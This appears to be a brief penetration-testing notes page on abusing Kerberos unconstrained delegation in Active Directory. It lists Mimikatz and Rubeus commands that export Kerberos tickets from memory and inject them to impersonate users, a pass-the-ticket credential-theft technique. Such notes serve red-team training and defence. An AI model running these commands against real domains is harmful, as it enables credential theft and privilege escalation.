---
coverY: 0
---

# 🟢 Unconstrained Delegation

Unconstrained delegation is a feature within Windows Active Directory environments that allows a service to act on behalf of a user. This means a service, when granted the permission to use unconstrained delegation, can access resources anywhere in the domain using the identity of a user who has authenticated to the service.

The commands under both the MimiKatz and Rubeus sections are tools used to exploit the unconstrained delegation feature.&#x20;

These tools can request, export, and import Kerberos tickets, allowing attackers to impersonate any user who has authenticated to the compromised service, potentially leading to elevated privileges within the domain.

### Unconstrained Delegation with MimiKatz

```
sekurlsa::tickets /export
kerberos::ptt c:\path\to\ticket.kirbi
```

### Unconstrained Delegation with Rubeus

```
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x5379f2 /nowrap
.\Rubeus.exe ptt /ticket:RFSSCC[...]
```
